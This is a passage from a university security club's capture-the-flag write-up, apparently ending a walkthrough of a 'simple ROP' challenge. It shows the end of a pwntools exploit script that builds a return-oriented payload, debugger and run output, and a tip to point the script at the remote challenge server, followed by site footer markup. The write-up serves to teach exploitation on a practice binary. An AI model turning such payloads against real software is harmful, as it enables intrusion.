</span><span id=__span-17-12><a href=#__codelineno-17-12 id=__codelineno-17-12 name=__codelineno-17-12></a><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>password_addr</span><span class=p>)</span>
</span><span id=__span-17-13><a href=#__codelineno-17-13 id=__codelineno-17-13 name=__codelineno-17-13></a><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x4016f5</span><span class=p>)</span>
</span><span id=__span-17-14><a href=#__codelineno-17-14 id=__codelineno-17-14 name=__codelineno-17-14></a>
</span><span id=__span-17-15><a href=#__codelineno-17-15 id=__codelineno-17-15 name=__codelineno-17-15></a><span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>'&gt; '</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span><span id=__span-17-16><a href=#__codelineno-17-16 id=__codelineno-17-16 name=__codelineno-17-16></a><span class=nb>print</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvall</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
</span></code></pre></div> <p>Running it, we can see that GEF says all of our values are loaded at the strcmp breakpoint!</p> <div class="language-text highlight"><pre><span></span><code><span id=__span-18-1><a href=#__codelineno-18-1 id=__codelineno-18-1 name=__codelineno-18-1></a>────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
</span><span id=__span-18-2><a href=#__codelineno-18-2 id=__codelineno-18-2 name=__codelineno-18-2></a>0x4010a0 (
</span><span id=__span-18-3><a href=#__codelineno-18-3 id=__codelineno-18-3 name=__codelineno-18-3></a>   $rdi = 0x000000000047a008 → "sluggggggggggggggggggsecure_umm_yeah_i_sure_hope_i[...]",
</span><span id=__span-18-4><a href=#__codelineno-18-4 id=__codelineno-18-4 name=__codelineno-18-4></a>   $rsi = 0x000000000047a008 → "sluggggggggggggggggggsecure_umm_yeah_i_sure_hope_i[...]",
</span><span id=__span-18-5><a href=#__codelineno-18-5 id=__codelineno-18-5 name=__codelineno-18-5></a>   $rdx = 0x000000000047a008 → "sluggggggggggggggggggsecure_umm_yeah_i_sure_hope_i[...]"
</span><span id=__span-18-6><a href=#__codelineno-18-6 id=__codelineno-18-6 name=__codelineno-18-6></a>)
</span><span id=__span-18-7><a href=#__codelineno-18-7 id=__codelineno-18-7 name=__codelineno-18-7></a>────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
</span><span id=__span-18-8><a href=#__codelineno-18-8 id=__codelineno-18-8 name=__codelineno-18-8></a>[#0] Id 1, Name: "chall", stopped 0x40171b in ?? (), reason: BREAKPOINT
</span><span id=__span-18-9><a href=#__codelineno-18-9 id=__codelineno-18-9 name=__codelineno-18-9></a>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
</span><span id=__span-18-10><a href=#__codelineno-18-10 id=__codelineno-18-10 name=__codelineno-18-10></a>[#0] 0x40171b → call 0x4010a0
</span><span id=__span-18-11><a href=#__codelineno-18-11 id=__codelineno-18-11 name=__codelineno-18-11></a>[#1] 0x7ffd9147e300 → add BYTE PTR [rax], al
</span><span id=__span-18-12><a href=#__codelineno-18-12 id=__codelineno-18-12 name=__codelineno-18-12></a>[#2] 0x7ffd9147e3d8 → jle 0x7ffd9147e3c9
</span></code></pre></div> <p>And we get our output:</p> <div class="language-text highlight"><pre><span></span><code><span id=__span-19-1><a href=#__codelineno-19-1 id=__codelineno-19-1 name=__codelineno-19-1></a>$ python solve.py
</span><span id=__span-19-2><a href=#__codelineno-19-2 id=__codelineno-19-2 name=__codelineno-19-2></a>[+] Starting local process '/usr/bin/gdbserver': pid 850069
</span><span id=__span-19-3><a href=#__codelineno-19-3 id=__codelineno-19-3 name=__codelineno-19-3></a>[*] running in new terminal: ['/usr/bin/gdb', '-q', './chall', '-x', '/tmp/pwn15zls2jp.gdb']
</span><span id=__span-19-4><a href=#__codelineno-19-4 id=__codelineno-19-4 name=__codelineno-19-4></a>[*] '/pwn-simple-rop/chall'
</span><span id=__span-19-5><a href=#__codelineno-19-5 id=__codelineno-19-5 name=__codelineno-19-5></a>    Arch:     amd64-64-little
</span><span id=__span-19-6><a href=#__codelineno-19-6 id=__codelineno-19-6 name=__codelineno-19-6></a>    RELRO:    Partial RELRO
</span><span id=__span-19-7><a href=#__codelineno-19-7 id=__codelineno-19-7 name=__codelineno-19-7></a>    Stack:    No canary found
</span><span id=__span-19-8><a href=#__codelineno-19-8 id=__codelineno-19-8 name=__codelineno-19-8></a>    NX:       NX disabled
</span><span id=__span-19-9><a href=#__codelineno-19-9 id=__codelineno-19-9 name=__codelineno-19-9></a>    PIE:      No PIE (0x400000)
</span><span id=__span-19-10><a href=#__codelineno-19-10 id=__codelineno-19-10 name=__codelineno-19-10></a>    RWX:      Has RWX segments
</span><span id=__span-19-11><a href=#__codelineno-19-11 id=__codelineno-19-11 name=__codelineno-19-11></a>[+] Receiving all data: Done (361B)
</span><span id=__span-19-12><a href=#__codelineno-19-12 id=__codelineno-19-12 name=__codelineno-19-12></a>[*] Process '/usr/bin/gdbserver' stopped with exit code 0 (pid 850072)
</span><span id=__span-19-13><a href=#__codelineno-19-13 id=__codelineno-19-13 name=__codelineno-19-13></a>
</span><span id=__span-19-14><a href=#__codelineno-19-14 id=__codelineno-19-14 name=__codelineno-19-14></a>nice to meet ya AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x16@!
</span><span id=__span-19-15><a href=#__codelineno-19-15 id=__codelineno-19-15 name=__codelineno-19-15></a>let's test your binary exploitation skills. only the best hackers can join our team...
</span><span id=__span-19-16><a href=#__codelineno-19-16 id=__codelineno-19-16 name=__codelineno-19-16></a>i am not impressed. this meeting is over.
</span><span id=__span-19-17><a href=#__codelineno-19-17 id=__codelineno-19-17 name=__codelineno-19-17></a>wowza you're a pro!! submit this solution to our server for the real reward
</span></code></pre></div> <p>Just like the last one, replace the <code>gdb.debug()</code>/<code>process()</code> call with <code>remote()</code> to connect to the challenge instance and get the real flag.</p> <aside class=md-source-file> <span class=md-source-file__fact> <span class=md-icon title="Last update"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1-2.1-2M12.5 7v5.2l4 2.4-1 1L11 13V7h1.5M11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2v1.8Z"/></svg> </span> <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class=timeago datetime=2024-12-10T23:42:46+00:00 locale=en></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2024-12-10</span> </span> <span class=md-source-file__fact> <span class=md-icon title=Created> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M14.47 15.08 11 13V7h1.5v5.25l3.08 1.83c-.41.28-.79.62-1.11 1m-1.39 4.84c-.36.05-.71.08-1.08.08-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8c0 .37-.03.72-.08 1.08.69.1 1.33.32 1.92.64.1-.56.16-1.13.16-1.72 0-5.5-4.5-10-10-10S2 6.5 2 12s4.47 10 10 10c.59 0 1.16-.06 1.72-.16-.32-.59-.54-1.23-.64-1.92M18 15v3h-3v2h3v3h2v-3h3v-2h-3v-3h-2Z"/></svg> </span> <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class=timeago datetime=2024-12-10T11:35:59+00:00 locale=en></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2024-12-10</span> </span> </aside> <h2 id=__comments>Comments</h2> <script src="https://giscus.app/client.js" data-repo="SlugSecurity/site" data-repo-id="R_kgDOIvCW_Q" data-category="General" data-category-id="DIC_kwDOIvCW_c4Cf5Zw" data-mapping="pathname" data-strict="0" data-reactions-enabled="0" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="en" crossorigin="anonymous" async=>
	</script> <!-- Synchronize Giscus theme with palette --> <script>
		var giscus = document.querySelector("script[src*=giscus]")

		// Set palette on initial load
		var palette = __md_get("__palette")
		if (palette && typeof palette.color === "object") {
			var theme = palette.color.scheme === "slate"
				? "transparent_dark"
				: "light"

			// Instruct Giscus to set theme
			giscus.setAttribute("data-theme", theme)
		}

		// Register event handlers after documented loaded
		document.addEventListener("DOMContentLoaded", function() {
			var ref = document.querySelector("[data-md-component=palette]")

			ref.addEventListener("change", function() {
				var palette = __md_get("__palette")
				if (palette && typeof palette.color === "object") {
					var theme = palette.color.scheme === "slate"
						? "transparent_dark"
						: "light"

					// Instruct Giscus to change theme
					var frame = document.querySelector(".giscus-frame")
					frame.contentWindow.postMessage(
						{ giscus: { setConfig: { theme } } },
						"https://giscus.app"
					)
				}
			})
		})
	</script> </article> </div> <script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script> </div> <button type=button class="md-top md-icon" data-md-component=top hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg> Back to top </button> </main> <footer class=md-footer> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-social> <a href="https://discord.gg/NUVZCumQXB" target="_blank" rel="noopener" title="Join our Discord" class="md-social__link"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 640 512"><!-- Font Awesome Free 6.5.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M524.531 69.836a1.5 1.5 0 0 0-.764-.7A485.065 485.065 0 0 0 404.081 32.03a1.816 1.816 0 0 0-1.923.91 337.461 337.461 0 0 0-14.9 30.6 447.848 447.848 0 0 0-134.426 0 309.541 309.541 0 0 0-15.135-30.6 1.89 1.89 0 0 0-1.924-.91 483.689 483.689 0 0 0-119.688 37.107 1.712 1.712 0 0 0-.788.676C39.068 183.651 18.186 294.69 28.43 404.354a2.016 2.016 0 0 0 .765 1.375 487.666 487.666 0 0 0 146.825 74.189 1.9 1.9 0 0 0 2.063-.676A348.2 348.2 0 0 0 208.12 430.4a1.86 1.86 0 0 0-1.019-2.588 321.173 321.173 0 0 1-45.868-21.853 1.885 1.885 0 0 1-.185-3.126 251.047 251.047 0 0 0 9.109-7.137 1.819 1.819 0 0 1 1.9-.256c96.229 43.917 200.41 43.917 295.5 0a1.812 1.812 0 0 1 1.924.233 234.533 234.533 0 0 0 9.132 7.16 1.884 1.884 0 0 1-.162 3.126 301.407 301.407 0 0 1-45.89 21.83 1.875 1.875 0 0 0-1 2.611 391.055 391.055 0 0 0 30.014 48.815 1.864 1.864 0 0 0 2.063.7A486.048 486.048 0 0 0 610.7 405.729a1.882 1.882 0 0 0 .765-1.352c12.264-126.783-20.532-236.912-86.934-334.541ZM222.491 337.58c-28.972 0-52.844-26.587-52.844-59.239s23.409-59.241 52.844-59.241c29.665 0 53.306 26.82 52.843 59.239 0 32.654-23.41 59.241-52.843 59.241Zm195.38 0c-28.971 0-52.843-26.587-52.843-59.239s23.409-59.241 52.843-59.241c29.667 0 53.307 26.82 52.844 59.239 0 32.654-23.177 59.241-52.844 59.241Z"/></svg> </a> <a href=mailto:slugsec@ucsc.edu target=_blank rel=noopener title="Send us an email" class=md-social__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 512 512"><!-- Font Awesome Free 6.5.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M64 112c-8.8 0-16 7.2-16 16v22.1l172.5 141.6c20.7 17 50.4 17 71.1 0L464 150.1V128c0-8.8-7.2-16-16-16H64zM48 212.2V384c0 8.8 7.2 16 16 16h384c8.8 0 16-7.2 16-16V212.2L322 328.8c-38.4 31.5-93.7 31.5-132 0L48 212.2zM0 128c0-35.3 28.7-64 64-64h384c35.3 0 64 28.7 64 64v256c0 35.3-28.7 64-64 64H64c-35.3 0-64-28.7-64-64V128z"/></svg> </a> <a href="https://twitter.com/SlugSec" target="_blank" rel="noopener" title="Follow us on Twitter" class="md-social__link"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 512 512"><!-- Font Awesome Free 6.5.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8l164.9-188.5L26.8 48h145.6l100.5 132.9L389.2 48zm-24.8 373.8h39.1L151.1 88h-42l255.3 333.8z"/></svg> </a> <a href="https://instagram.com/SlugSec" target="_blank" rel="noopener" title="Follow us on Instagram" class="md-social__link"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><!-- Font Awesome Free 6.5.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"/></svg> </a> <a href="https://youtube.com/@SlugSec" target="_blank" rel="noopener" title="Subscribe to our YouTube" class="md-social__link"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 576 512"><!-- Font Awesome Free 6.5.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M549.655 124.083c-6.281-23.65-24.787-42.276-48.284-48.597C458.781 64 288 64 288 64S117.22 64 74.629 75.486c-23.497 6.322-42.003 24.947-48.284 48.597-11.412 42.867-11.412 132.305-11.412 132.305s0 89.438 11.412 132.305c6.281 23.65 24.787 41.5 48.284 47.821C117.22 448 288 448 288 448s170.78 0 213.371-11.486c23.497-6.321 42.003-24.171 48.284-47.821 11.412-42.867 11.412-132.305 11.412-132.305s0-89.438-11.412-132.305zm-317.51 213.508V175.185l142.739 81.205-142.739 81.201z"/></svg> </a> <a href="https://linkedin.com/company/SlugSec" target="_blank" rel="noopener" title="Connect with us on LinkedIn" class="md-social__link"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><!-- Font Awesome Free 6.5.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg> </a> <a href="https://github.com/SlugSecurity" target="_blank" rel="noopener" title="Follow us on GitHub" class="md-social__link"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 496 512"><!-- Font Awesome Free 6.5.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg> </a> <a href="https://ctftime.org/team/228068" target="_blank" rel="noopener" title="Join us on CTFtime" class="md-social__link"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><!-- Font Awesome Free 6.5.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M64 32C64 14.3 49.7 0 32 0S0 14.3 0 32v448c0 17.7 14.3 32 32 32s32-14.3 32-32V352l64.3-16.1c41.1-10.3 84.6-5.5 122.5 13.4 44.2 22.1 95.5 24.8 141.7 7.4l34.7-13c12.5-4.7 20.8-16.6 20.8-30V66.1c0-23-24.2-38-44.8-27.7l-9.6 4.8c-46.3 23.2-100.8 23.2-147.1 0-35.1-17.6-75.4-22-113.5-12.5L64 48V32z"/></svg> </a> </div> <div class=md-copyright> <div class=md-copyright__highlight> &copy; 2025 Regents of the University of California </div> </div> <div class=md-footer-msg> Slug Security is a 501(c)(3) nonprofit organization (EIN 94-1539563). </div> </div> </div> </footer> </div> <div class=md-dialog data-md-component=dialog> <div class="md-dialog__inner md-typeset"></div> </div> <div class=md-progress data-md-component=progress role=progressbar></div> <script id=__config type=application/json>{"base": "../..", "features": ["navigation.instant", "navigation.instant.prefetch", "navigation.instant.progress", "navigation.sections", "navigation.tabs", "navigation.tabs.sticky", "navigation.top", "navigation.indexes", "navigation.prune", "content.action.edit", "content.action.view", "content.code.annotate", "content.code.copy", "content.tooltips", "toc.follow", "announce.dismiss"], "search": "../../assets/javascripts/workers/search.1e90e0fb.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script> <script src=../../assets/javascripts/bundle.0d59af3e.min.js></script> <script src=../../js/timeago.min.js></script> <script src=../../js/timeago_mkdocs_material.js></script> <script src=../../js/open_in_new_tab.js></script> <script>document$.subscribe(() => {document.querySelectorAll('.glightbox').forEach(function(element) {
    var imgSrc = element.querySelector('img').src;
    element.setAttribute('href', imgSrc);
});
const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": false, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});})</script></body> </html>